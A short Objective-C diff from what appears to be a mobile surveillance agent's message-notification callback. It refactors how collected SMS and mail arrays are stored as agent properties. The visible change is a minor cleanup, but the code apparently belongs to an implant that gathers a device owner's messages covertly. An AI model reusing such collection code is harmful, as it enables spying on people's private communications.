@@ -182,14 +182,14 @@ static void MsgNotificationCallback (CFNotificationCenterRef center,
   NSDictionary *smsDict     = [[NSDictionary alloc] initWithObjects: [NSArray arrayWithObjects: smsArray, mailArray, nil] 
                                                             forKeys: [NSArray arrayWithObjects: @"SMS", @"MAIL", nil]];
   
-  NSDictionary *agentDict   = [[NSDictionary alloc] initWithObjects: [NSArray arrayWithObjects: smsDict, nil]
-                                                            forKeys: [NSArray arrayWithObjects: [[self class] description], nil]];
+//  NSDictionary *agentDict   = [[NSDictionary alloc] initWithObjects: [NSArray arrayWithObjects: smsDict, nil]
+//                                                            forKeys: [NSArray arrayWithObjects: [[self class] description], nil]];
   
   //setRcsPropertyWithName([[self class] description], agentDict);
   [[_i_Utils sharedInstance] setPropertyWithName:[[self class] description]
-                                  withDictionary:agentDict];
+                                  withDictionary:smsDict];
   
-  [agentDict release];
+//  [agentDict release];
   [smsDict release];
   [smsReal release];
   [smsCllt release];
